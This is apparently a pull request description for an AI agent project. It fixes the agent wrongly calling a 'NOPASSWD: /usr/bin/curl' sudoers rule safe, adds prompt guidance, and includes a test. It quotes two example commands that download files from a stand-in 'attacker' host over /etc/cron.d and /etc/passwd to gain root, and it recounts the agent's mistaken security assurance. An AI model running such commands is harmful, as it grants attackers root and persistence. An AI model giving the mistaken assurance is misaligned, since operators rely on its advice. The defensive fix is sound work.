# fix(agent): stop calling write-capable `NOPASSWD` sudoers rules "safe"

Closes #15028

## Summary

While setting up a cron job that runs `sudo curl … -o /etc/mihomo/config.yaml`, the agent suggested
`NOPASSWD: /usr/bin/curl` in sudoers. Asked whether to tighten it, the agent said keeping that rule
"这已经比较安全了" ("this is already relatively safe").

That is wrong. With `NOPASSWD` on a program that can write any path, anyone who controls the account
has root:

```bash
sudo curl http://attacker/backdoor -o /etc/cron.d/backdoor
sudo curl http://attacker/passwd   -o /etc/passwd
```

The approval gate worked as designed. The operator approved each command. What failed was the
security advice the operator relied on to decide. This PR adds a short rule to the system prompt of
every session that has the `terminal` tool, so the model stops giving that advice.

## What changed

| File | Change |
|---|---|
| `agent/prompt_builder.py` | New `PRIVILEGE_ESCALATION_GUIDANCE` constant (one paragraph, about 480 chars). |
| `agent/system_prompt.py` | `_tool_guidance_block()` adds it when `"terminal"` is in `agent.valid_tool_names`, next to the existing memory, session_search, skills and kanban guidance. |
| `tests/agent/test_system_prompt.py` | One parametrized invariant test: a terminal session gets the rule and a session without a terminal does not. |

The guidance text:

> When granting privileges (sudoers, NOPASSWD, setuid, polkit, doas), never call a rule safe or
> restricted if the allowed program can write arbitrary paths, run other programs, or spawn a shell
> (curl/wget -o, tee, cp, mv, dd, sed -i, vim, less, find, tar, rsync, python, bash, ...):
> `NOPASSWD: /usr/bin/curl` equals full root. Say so plainly, and recommend a root-owned,
> non-user-writable wrapper script with hardcoded arguments (or root's own crontab) as the sudoers
> target instead.

This covers both rules proposed in the issue:
1. Don't recommend `NOPASSWD` for write-capable commands.
2. Never call such a rule "safe". Point to a wrapper script with hardcoded arguments instead.

It also names the fix that works for this issue's case: put the download in **root's own crontab**,
so no sudoers entry is needed.

## Design notes (checked against the root `AGENTS.md` rubric)

- **Footprint Ladder, rung 1: extend existing code.** This adds no tool, config key or env var. It
  uses the per-tool guidance slot that already exists, `_tool_guidance_block`.
- **Gated on the tool, not on a model or platform.** The mistake only matters when the model can run
  shell commands, so the rule ships only when `terminal` is loaded. Sessions without a terminal
  (e.g. a read-only gateway toolset) don't pay for it.
- **Prompt-cache safe.** The text is a static constant, and the toolset is fixed for the whole
  session. The system prompt stays byte-stable for the life of a conversation. Existing
  terminal sessions pick it up at their next prompt rebuild (new session or compaction). Nothing
  is invalidated mid-conversation.
- **No new approval or hardline rule.** Writes to `/etc/` (including `/etc/sudoers*`) are already
  flagged as sensitive writes by `tools/approval_detection.py`. `tools/skills_guard.py` already flags
  `NOPASSWD` in skills, and `tools/cronjob_prompt_scan.py` flags `/etc/sudoers|visudo` in cron
  prompts. Blocking `NOPASSWD` in the terminal would break legitimate operator setups (the fleet path in
  `hermes update` itself supports a scoped `NOPASSWD` entry for `hermes-gateway*` units). The gap was the model's
  *assessment*, so the fix is in the prompt.
- **Kept tight.** Like `TASK_COMPLETION_GUIDANCE`, this text is in every terminal session's cached
  prompt, so it is one paragraph with a concrete example and no bullet list.

## Tests

The new invariant test is `test_privilege_escalation_guidance_follows_terminal_tool`:

| Case | Asserts |
|---|---|
| `valid_tool_names={"terminal"}` | `PRIVILEGE_ESCALATION_GUIDANCE` is in `build_system_prompt(...)` |
| `valid_tool_names={"read_file", "web_search"}` | it is **not** in the prompt |

It tests how the toolset relates to the prompt contents. It is not a snapshot of the wording, so
editing the text won't break it.

**Red on base:** with the `system_prompt.py` wiring reverted, the `terminal` case fails
(`AssertionError: … in 'You are Hermes Agent…' is True`).

**Green with the fix:**

```
$ scripts/run_tests.sh tests/agent/test_system_prompt.py \
    tests/agent/test_skills_guidance_content_filter.py tests/agent/test_prompt_builder.py
=== Summary: 3 files, 126 tests passed, 0 failed (100% complete) ===

$ ruff check agent/prompt_builder.py agent/system_prompt.py tests/agent/test_system_prompt.py
All checks passed!
```

## Manual check

Repeat the issue's scenario in a terminal-enabled session: "set up a cron job that runs
`sudo curl URL -o /etc/foo/config.yaml` without a password prompt." The agent should say that
`NOPASSWD: /usr/bin/curl` is equivalent to root. It should then recommend root's crontab, or a
root-owned wrapper script with a hardcoded URL and destination as the only sudoers target.

## Risk

Low. The change is additive prompt text, gated on the terminal tool. The only runtime effect is
about 480 more characters in the cached system prompt of terminal sessions.
